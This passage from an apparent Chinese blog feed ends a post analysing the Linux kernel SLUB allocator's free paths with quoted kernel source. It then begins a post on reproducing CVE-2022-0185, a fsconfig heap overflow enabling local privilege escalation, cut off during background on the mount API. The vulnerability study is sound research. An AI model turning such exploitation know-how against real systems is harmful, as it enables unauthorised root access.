*/</span><br>barrier();<br><br><span class="hljs-comment">// 不属于 percpu slab，调用 __slab_free() 进行释放</span><br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>__slab_free(s, slab, head, tail_obj, cnt, addr);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (USE_LOCKLESS_FAST_PATH()) &#123;<br>freelist = READ_ONCE(c-&gt;freelist);<br><br><span class="hljs-comment">// 直接将 percpu freelist 接到 tail_obj 后面</span><br>set_freepointer(s, tail_obj, freelist);<br><br><span class="hljs-keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(<br>s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,<br>freelist, tid,<br>head, next_tid(tid)))) &#123;<br><br>note_cmpxchg_failure(<span class="hljs-string">&quot;slab_free&quot;</span>, s, tid);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Update the free list under the local lock */</span><br>local_lock(&amp;s-&gt;cpu_slab-&gt;lock);<br>c = this_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br>tid = c-&gt;tid;<br>freelist = c-&gt;freelist;<br><br><span class="hljs-comment">// 直接将 percpu freelist 接到 tail_obj 后面</span><br>set_freepointer(s, tail_obj, freelist);<br>c-&gt;freelist = head;<br>c-&gt;tid = next_tid(tid);<br><br>local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);<br>&#125;<br>stat(s, FREE_FASTPATH);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="II-slab-free-：释放回对应的-slab（slow-path）">II. __slab_free()：释放回对应的 slab（slow path）</h3><p>如果待释放对象不属于 percpu clab，则调用 <code>__slab_free()</code> 进行释放：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 处理慢速路径. 这可能会被频繁调用因为在大部分情况下对象比cpu slab生命周期更长</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 所以我们仍尝试减少缓存行的使用率. 拿取 slab lock 并释放对象即可.</span><br><span class="hljs-comment"> * 若不需要额外的 partial slab handling 我们便可立即返回.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __slab_free(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,<br><span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail, <span class="hljs-type">int</span> cnt,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)<br><br>&#123;<br><span class="hljs-type">void</span> *prior;<br><span class="hljs-type">int</span> was_frozen;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">n</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br>stat(s, FREE_SLOWPATH);<br></code></pre></td></tr></table></figure><p>首先还是 kfence 和 debug 相关，如果该 <code>kmem_cache</code> 设置了 <code>SLAB_DEBUG_FLAGS</code> 标志位则直接调用 <code>free_to_partial_list()</code> 后返回即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (kfence_free(head))<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_SLUB_TINY) || kmem_cache_debug(s)) &#123;<br>free_to_partial_list(s, slab, head, tail, cnt, addr);<br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后是一个 <code>do while</code> 循环，首先会将 <strong><code>待释放 freelist 所属 slab 的 freelist</code></strong> 连接到 <strong><code>待释放 freelist 的 tail object</code></strong> 后边，这里的 <code>new</code> 是一个栈上的临时 slab 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">if</span> (unlikely(n)) &#123;<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>n = <span class="hljs-literal">NULL</span>;<br>&#125;<br>prior = slab-&gt;freelist;<br>counters = slab-&gt;counters;<br>set_freepointer(s, tail, prior);<br>new.counters = counters;<br>was_frozen = new.frozen;<br>new.inuse -= cnt;<br></code></pre></td></tr></table></figure><p>接下来检查是否  <strong><code>(所有的对象都*将*为空闲对象 || 原 slab 上无空闲对象) &amp;&amp; slab 未被冻结</code></strong> ，若满足该条件则：</p><ul><li>检查是否有 percpu partial slab 且原 slab 上无空闲对象（即 slab-&gt;freelist（也就是代码中的 <code>prior</code>）为 NULL）：<ul><li>若是，则设置 slab 将被冻结（<code>new.frozen=1</code>）</li><li>若否，则获取 slab 所对应的 <code>kmem_cache_node</code></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((!new.inuse || !prior) &amp;&amp; !was_frozen) &#123;<br><br><span class="hljs-keyword">if</span> (kmem_cache_has_cpu_partial(s) &amp;&amp; !prior) &#123;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab 之前不在链表上且将会部分为空</span><br><span class="hljs-comment"> * 我们可以推迟链表移动，而是反之将其冻结.</span><br><span class="hljs-comment"> */</span><br>new.frozen = <span class="hljs-number">1</span>;<br><br>&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">/* 需要从一个链表上取下 */</span><br><br>n = get_node(s, slab_nid(slab));<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 推测性地获取 list_lock.</span><br><span class="hljs-comment"> * 若 cmpxchg 未成功，则我们可能</span><br><span class="hljs-comment"> * 在不进行任何处理的情况下放弃 list_lock.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 否则 list_lock 将与其他处理器同步更新 slabs 链表</span><br><span class="hljs-comment"> */</span><br>spin_lock_irqsave(&amp;n-&gt;list_lock, flags);<br><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>循环的终止条件用了一个 <code>cmpxchg_double_slab()</code> 函数，<s>套娃套得👴头昏眼花</s>，主要逻辑为：</p><ul><li><strong>对比 slab-&gt;freelist == prior &amp;&amp; slab-&gt;counters == counters，若是，则将 slab-&gt;freelist 设为 head 且将 slab-&gt;counters 设为 new.counters</strong>，该操作成功则返回 true，条件不符则返回 false</li></ul><p>成功了循环将会直接跳出：）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">while</span> (!cmpxchg_double_slab(s, slab,<br>prior, counters,<br>head, new.counters,<br><span class="hljs-string">&quot;__slab_free&quot;</span>));<br></code></pre></td></tr></table></figure><p>接下来检查**该 slab 是否需要从一个 <code>kmem_cache_node</code> 的链表上取下，若否，**则：</p><ul><li>若 slab 已经被冻结，stat() 一下（基本上等于啥都不做）</li><li>若 slab 需要被冻结 （<code>new.frozen</code> 为 true），调用 <code>put_cpu_partial()</code> 直接将 slab 放到 percpu partial 链表</li><li>释放工作完成，返回</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (likely(!n)) &#123;<br><br><span class="hljs-keyword">if</span> (likely(was_frozen)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 链表锁未被占用，因此不需要活跃任何链表.</span><br><span class="hljs-comment"> */</span><br>stat(s, FREE_FROZEN);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (new.frozen) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we just froze the slab then put it onto the</span><br><span class="hljs-comment"> * per cpu partial list.</span><br><span class="hljs-comment"> */</span><br>put_cpu_partial(s, slab, <span class="hljs-number">1</span>);<br>stat(s, CPU_PARTIAL_FREE);<br>&#125;<br><br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果 slab 上所有对象都被释放，且 node 上的 partial slab 数量已经超过 <code>kmem_cache-&gt;min_partial</code> ，<strong>这意味着这是一张完全空闲的 slab</strong>，接下来跳转到 <code>slab_empty</code> 标签，该标签对应代码块主要是：</p><ul><li>若 slab 上原来有空闲对象（位于 node partial 链表），则从 partial 链表移除</li><li>若 slab 上原来无空闲对象（位于 node full 链表），则从 full 链表移除</li><li><strong>最后调用 <code>discard_slab()</code> 释放这一张 slab</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (unlikely(!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial))<br><span class="hljs-keyword">goto</span> slab_empty;<br><br><span class="hljs-comment">//...</span><br><br>slab_empty:<br><span class="hljs-keyword">if</span> (prior) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab on the partial list.</span><br><span class="hljs-comment"> */</span><br>remove_partial(n, slab);<br>stat(s, FREE_REMOVE_PARTIAL);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Slab must be on the full list */</span><br>remove_full(s, n, slab);<br>&#125;<br><br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>stat(s, FREE_SLAB);<br>discard_slab(s, slab);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>若不满足上面的条件，则检查是否没有 percpu partial slab 且 slab 上原 freelist 为 NULL（即位于 node full 链表），若是则从 full 链表移除并添加到 node partial 链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Objects left in the slab. If it was not on the partial list before</span><br><span class="hljs-comment"> * then add it.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!kmem_cache_has_cpu_partial(s) &amp;&amp; unlikely(!prior)) &#123;<br>remove_full(s, n, slab);<br>add_partial(n, slab, DEACTIVATE_TO_TAIL);<br>stat(s, FREE_ADD_PARTIAL);<br>&#125;<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br><span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure><p>至此， slub 算法的释放逻辑分析完毕</p><h2 id="二、kfree：通用的上层释放接口">二、kfree：通用的上层释放接口</h2><p>正如同 <code>kmalloc()</code> 是最为通用的内核对象分配函数，与之相对应的释放函数便是 <code>kfree()</code> 了，这个函数其实主要就是 <code>__kmem_cache_free()</code> 的 wrapper，对于较大的对象则会用 <code>free_large_kmalloc()</code> 进行释放，如果 object 为 NULL 则直接返回：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * kfree - 释放之前分配的对象</span><br><span class="hljs-comment"> * @object: kmalloc 返回的指针.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若 @object 为 NULL, 则不会进行任何操作.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 不要释放不由 kmalloc() 分配的内存，否则会出问题.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">kfree</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *object)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">folio</span> *<span class="hljs-title">folio</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">s</span>;</span><br><br>trace_kfree(_RET_IP_, object);<br><br><span class="hljs-keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(object)))<br><span class="hljs-keyword">return</span>;<br><br>folio = virt_to_folio(object);<br><span class="hljs-keyword">if</span> (unlikely(!folio_test_slab(folio))) &#123;<br>free_large_kmalloc(folio, (<span class="hljs-type">void</span> *)object);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>slab = folio_slab(folio);<br>s = slab-&gt;slab_cache;<br>__kmem_cache_free(s, (<span class="hljs-type">void</span> *)object, _RET_IP_);<br>&#125;<br>EXPORT_SYMBOL(kfree);<br></code></pre></td></tr></table></figure><h3 id="I-folio-结构：一段物理、虚拟、逻辑上都连续的内存">I. folio 结构：一段物理、虚拟、逻辑上都连续的内存</h3><p>注意到这里用了一个名为 <code>folio</code> 的结构体，其表示了<strong>一块物理、虚拟、逻辑上都连续的内存</strong>，  <em>其实本质上还是复用了 page 结构体，只不过这一次是将 page 转为 folio</em>  ，定义比较长这里就不贴代码了</p><p><code>virt_to_folio()</code> 首先会用 <code>virt_to_page()</code> 找到待释放对象虚拟地址对应的 <code>page</code> 结构体，之后用 <code>page_folio()</code> 将其转换为 folio 结构体——其实就是对于复合页而言会找到第一张页面，由此如果是复合页的话那说明是大 slab 所以会调用 <code>free_large_kmalloc()</code>，不是复合页说明是小 slab 所以会调用 <code>__kmem_cache_free()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> folio *<span class="hljs-title function_">virt_to_folio</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *x)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> virt_to_page(x);<br><br><span class="hljs-keyword">return</span> page_folio(page);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> page_folio(p)(_Generic((p),\</span><br><span class="hljs-meta">const struct page *:(const struct folio *)_compound_head(p), \</span><br><span class="hljs-meta">struct page *:(struct folio *)_compound_head(p)))</span><br></code></pre></td></tr></table></figure><p>然后 <code>folio_test_slab()</code> 其实是 <code>include/linux/page-flags.h</code> 里的拼接宏，这里就不深入展开了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">bool</span> folio_test_#<span class="hljs-meta">#lname(struct folio *folio)\</span><br><span class="hljs-meta">&#123; return test_bit(PG_##lname, folio_flags(folio, FOLIO_##policy)); &#125;\</span><br></code></pre></td></tr></table></figure><h3 id="II-free-large-kmalloc-：直接将页面释放回-buddy-system">II. free_large_kmalloc()：直接将页面释放回 buddy system</h3><p>正如对于大对象的分配 <code>kmalloc_large()</code> 会直接从 buddy system 请求内存一般，相对应的 <code>free_large_kmalloc()</code> 也会直接将页面释放回 buddy system：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free_large_kmalloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> folio *folio, <span class="hljs-type">void</span> *object)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order = folio_order(folio);<br><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(order == <span class="hljs-number">0</span>))<br>pr_warn_once(<span class="hljs-string">&quot;object pointer: 0x%p\n&quot;</span>, object);<br><br>kmemleak_free(object);<br>kasan_kfree_large(object);<br>kmsan_kfree_large(object);<br><br>mod_lruvec_page_state(folio_page(folio, <span class="hljs-number">0</span>), NR_SLAB_UNRECLAIMABLE_B,<br>      -(PAGE_SIZE &lt;&lt; order));<br>__free_pages(folio_page(folio, <span class="hljs-number">0</span>), order);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="III-kmem-cache-free-：常规的释放函数">III. __kmem_cache_free()：常规的释放函数</h3><p><code>__kmem_cache_free()</code> 主要就是对 <code>slab_free()</code> 的 wrapper，不过会指定 tail 为 NULL：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __kmem_cache_free(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *x, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br>slab_free(s, virt_to_slab(x), x, <span class="hljs-literal">NULL</span>, &amp;x, <span class="hljs-number">1</span>, caller);<br>&#125;<br></code></pre></td></tr></table></figure><p>而 <code>slab_free()</code> 则会最终调用到 <code>do_slab_free()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __fastpath_inline <span class="hljs-type">void</span> <span class="hljs-title function_">slab_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,</span><br><span class="hljs-params">      <span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail, <span class="hljs-type">void</span> **p, <span class="hljs-type">int</span> cnt,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)</span><br>&#123;<br>memcg_slab_free_hook(s, slab, p, cnt);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * With KASAN enabled slab_free_freelist_hook modifies the freelist</span><br><span class="hljs-comment"> * to remove objects, whose reuse must be delayed.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (slab_free_freelist_hook(s, &amp;head, &amp;tail, &amp;cnt))<br>do_slab_free(s, slab, head, tail, cnt, addr);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里用到了一个函数 <code>slab_free_freelist_hook()</code>，主要的作用是遍历待释放的 freelist：</p><ul><li>如果设置了 free hook（ <code>slab_free_hook() == true</code> ），则仅减少计数以推迟释放</li><li>否则重新建立一遍 freelist 后返回</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">slab_free_freelist_hook</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s,</span><br><span class="hljs-params">   <span class="hljs-type">void</span> **head, <span class="hljs-type">void</span> **tail,</span><br><span class="hljs-params">   <span class="hljs-type">int</span> *cnt)</span><br>&#123;<br><br><span class="hljs-type">void</span> *object;<br><span class="hljs-type">void</span> *next = *head;<br><span class="hljs-type">void</span> *old_tail = *tail ? *tail : *head;<br><br><span class="hljs-keyword">if</span> (is_kfence_address(next)) &#123;<br>slab_free_hook(s, next, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">/* Head and tail of the reconstructed freelist */</span><br>*head = <span class="hljs-literal">NULL</span>;<br>*tail = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">do</span> &#123;<br>object = next;<br>next = get_freepointer(s, object);<br><br><span class="hljs-comment">/* If object&#x27;s reuse doesn&#x27;t have to be delayed */</span><br><span class="hljs-keyword">if</span> (!slab_free_hook(s, object, slab_want_init_on_free(s))) &#123;<br><span class="hljs-comment">/* Move object to the new freelist */</span><br>set_freepointer(s, object, *head);<br>*head = object;<br><span class="hljs-keyword">if</span> (!*tail)<br>*tail = object;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Adjust the reconstructed freelist depth</span><br><span class="hljs-comment"> * accordingly if object&#x27;s reuse is delayed.</span><br><span class="hljs-comment"> */</span><br>--(*cnt);<br>&#125;<br>&#125; <span class="hljs-keyword">while</span> (object != old_tail);<br><br><span class="hljs-keyword">if</span> (*head == *tail)<br>*tail = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> *head != <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三、上层调用接口关系图-2">三、上层调用接口关系图</h2><p>涉及到内存释放的函数相较于内存分配其实少很多，常用的主要就是 <code>kfree()</code>、<code>kfree_sensitive()</code>、<code>kmem_cache_free()</code> 这三大函数：</p><p><img src="https://s2.loli.net/2023/02/24/Itbqo2eO15yn7ZW.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;比起大的page👴还是喜欢小的object&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="http://blog.arttnba3.cn/categories/OS/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="内存管理" scheme="http://blog.arttnba3.cn/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
    <category term="slub allocator" scheme="http://blog.arttnba3.cn/tags/slub-allocator/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x09】CVE-2022-0185 漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/"/>
    <id>http://blog.arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/</id>
    <published>2023-01-11T04:04:19.000Z</published>
    <updated>2023-01-15T05:52:06.992Z</updated>
    
    <content type="html"><![CDATA[<p>还是 mount 好</p><span id="more"></span><h1>0x00.一切开始之前</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0185">CVE-2022-0185</a> 是 2022 年初爆出来的一个位于 filesystem context 系统中的 <code>fsconfig</code> 系统调用中的一个堆溢出漏洞，对于有着 <code>CAP_SYS_ADMIN</code> 权限（或是开启了 unprivileged namespace）的攻击者而言其可以利用该漏洞完成本地提权，该漏洞获得了高达 <code>8.4</code> 的 CVSS 评分</p><blockquote><p>发现漏洞的安全研究员的挖掘与利用过程参见<a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">这里</a>，本文编写时也有一定参考</p></blockquote><p>本文选择内核版本 <code>5.4</code> 进行分析，在开始分析之前，我们先来补充一些基础知识</p><h2 id="Filesystem-mount-API-初探">Filesystem mount API 初探</h2><blockquote><p>参见<a href="https://zhuanlan.zhihu.com/p/93592262">知乎上的该系列文章</a></p></blockquote><p>相信大家对于 Linux 下的文件系统的挂载都是非常熟悉—— <code>mount</code>  系统调用被用以将文件系统挂载到以 <code>/</code> 为根节点的文件树上，例如我们可以用如下命令挂载硬盘 <code>/dev/sdb1</code> 到 <code>/mnt/temp</code> 目录下，之后就能在该目录下进行文件访问：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sdb1 /mnt/temp</span><br></code></pre></td></tr></table></figure><p>或是通过编写程序的方式使用裸的 <code>mount</code> 系统调用进行挂载：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (argc &lt; <span 